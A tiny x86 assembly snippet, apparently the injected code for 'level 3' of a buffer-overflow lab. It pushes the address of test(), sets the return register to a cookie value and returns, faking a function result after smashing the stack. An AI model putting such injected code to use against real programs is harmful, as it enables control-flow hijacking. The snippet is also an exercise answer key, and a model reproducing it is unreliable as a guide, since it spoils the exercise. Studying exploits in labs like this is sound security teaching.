# assembly for level 3
pushl	$0x08048f70			# push address of test()
movl	$0x32af7935, %eax	# set return value to cookie
ret
